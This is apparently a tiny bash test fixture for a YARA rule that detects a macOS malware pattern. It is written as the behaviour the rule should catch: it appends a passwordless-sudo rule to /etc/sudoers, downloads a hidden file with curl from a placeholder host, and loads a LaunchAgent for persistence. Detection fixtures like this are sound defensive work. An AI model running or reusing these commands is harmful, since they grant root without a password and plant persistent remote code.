#!/bin/bash
# Inert YARA fixture for CERBER_MacOS_LaunchAgent_Sudo_Nopass - text only, not a working sample.
echo "$USER ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
curl -s https://example.invalid/agent -o /Users/Shared/.agent
launchctl load ~/Library/LaunchAgents/com.example.fixture.plist
